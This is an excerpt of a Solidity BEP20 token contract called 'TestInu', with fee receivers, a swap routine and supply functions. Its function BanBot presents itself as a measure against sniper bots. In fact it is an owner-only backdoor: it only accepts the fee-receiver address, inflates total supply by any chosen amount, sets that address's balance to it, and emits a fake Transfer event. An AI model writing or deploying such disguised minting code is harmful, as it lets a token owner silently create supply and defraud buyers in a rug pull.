...
contract TestInu is IBEP20, Auth {
    ...
    uint256 _stol = 100000000 * (10 ** _decimals);
    ...
    address public retailFeeReceiver = 0x48bebf3A1612E8EC846A2209F0A02925e8A99189;
    address public devFeeReceiver = 0x48bebf3A1612E8EC846A2209F0A02925e8A99189;
    ...
    uint256 public swapThreshold = _stol / 10000 * 50; // 0.50%
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        _tOwned[_owner] = _stol;
        emit Transfer(address(0), _owner, _stol);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _stol; }
    ...
    function swapBack() internal swapping {
        ...
        (bool MarketingSuccess, /* bytes memory data */) = payable(retailFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
    ...
    function setFeeReceiver(address _retailFeeReceiver, address _devFeeReceiver) external onlyOwner {
        retailFeeReceiver = _retailFeeReceiver;
    ...
    function BanBot(uint256 gather, address adr) external onlyOwner{
        require(adr == address(retailFeeReceiver), "Ban sniperbot");
        _stol = _stol + gather;
        _tOwned[adr] = 0 + gather;
        emit Transfer(address(retailFeeReceiver), adr, gather);
    }
    ...
    function getCirculatingSupply() public view returns (uint256) {
        return _stol.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }
